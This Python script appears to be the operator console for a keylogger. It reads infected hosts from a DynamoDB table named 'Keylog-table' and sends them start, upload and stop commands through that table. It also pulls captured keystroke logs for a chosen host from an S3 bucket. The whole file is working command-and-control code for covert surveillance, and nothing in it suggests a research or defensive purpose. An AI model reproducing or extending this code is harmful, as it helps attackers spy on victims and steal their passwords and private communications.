import boto3
import os
import sys
from boto3.dynamodb.conditions import Key
from dotenv import load_dotenv
import re

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def main():
    load_dotenv()

    dynamodb = boto3.resource('dynamodb')
    items = pull_items(dynamodb)
    host_names = [item.get('hostName') for item in items if 'hostName' in item]
    clear()
    print('Host(s) available:')

    for name in host_names:
        print(f'{name}')
    print('\n')

    host_name = input('Select host(s): ')
    clear()
    host_names_lowercase = [item.lower() for item in host_names]

    while True:
        if host_name.lower() in host_names_lowercase:
            lookup = {name.lower(): name for name in host_names}
            host_name = lookup.get(host_name.lower())
            break
        else:
            clear()
            print('Host not available\n')
            main()

    table = dynamodb.Table('Keylog-table')
    response = table.get_item(
        Key={'hostName': host_name}
    )

    item = response.get('Item')
    cmd = item['curr_cmd']
    select_cmds(host_name, dynamodb, cmd)
    clear()

def update_cmds(host_name, cmd, dynamodb):
    table = dynamodb.Table('Keylog-table')
    table.update_item(
        Key={'hostName': host_name},
        UpdateExpression='SET curr_cmd = :cmd',
        ExpressionAttributeValues={':cmd': cmd}
    )

def pull_items(dynamodb):
    table = dynamodb.Table('Keylog-table')
    response = table.scan()
    items = response.get('Items', [])
    return items

def download_files(host_name):
    s3 = boto3.resource('s3')
    bucket = s3.Bucket('vialathor-keylog')

    objects = bucket.objects.all()
    object_map = {}

    count = 1
    for object in objects:
        if host_name in object.key:
            print(f'{object.key} // {count}')
            object_map[count] = object
            count += 1
    print('\n')

    selection = input('Enter number to download or type ALL to download all: ').strip().lower()
    if selection == 'all':
        for object in objects:
            if host_name in object.key:
                bucket.download_file(object.key, f'{object.key}')
                #bucket.Object(object.key).delete()
    if bool(re.search(r'\d', selection)) == True:
        if int(selection) > count or int(selection) <= 0:
            clear()
            print(f'{selection} does not exist. Try < {count} \n')
            download_files(host_name)
        else:
            obj = object_map.get(int(selection))
            bucket.download_file(obj.key, f'{obj.key}')
            #bucket.Object(obj.key).delete()
    clear()
    print('Download successful!\n')

def select_cmds(host_name, dynamodb, cmd):
    print(f'Currently on host: {host_name} | Current cmd: {cmd}')
    while True:
        cmd = input('Enter cmd:\n- Start\n- Upload\n- Stop\n- Reselect\n- Download\n- Exit\n\n').strip().lower()        
        if cmd == 'start':
            clear()
            update_cmds(host_name, cmd, dynamodb)
        elif cmd == 'upload':
            clear()
            update_cmds(host_name, cmd, dynamodb)
        elif cmd == 'stop':
            clear()
            update_cmds(host_name, cmd, dynamodb)
        elif cmd == 'download':
            clear()
            download_files(host_name)
        elif cmd == 'reselect':
            clear()
            main()
        elif cmd == 'exit':
            sys.exit(0)
        else:
            clear()
            print('ERROR - Misinput')


if __name__ == '__main__':
    main()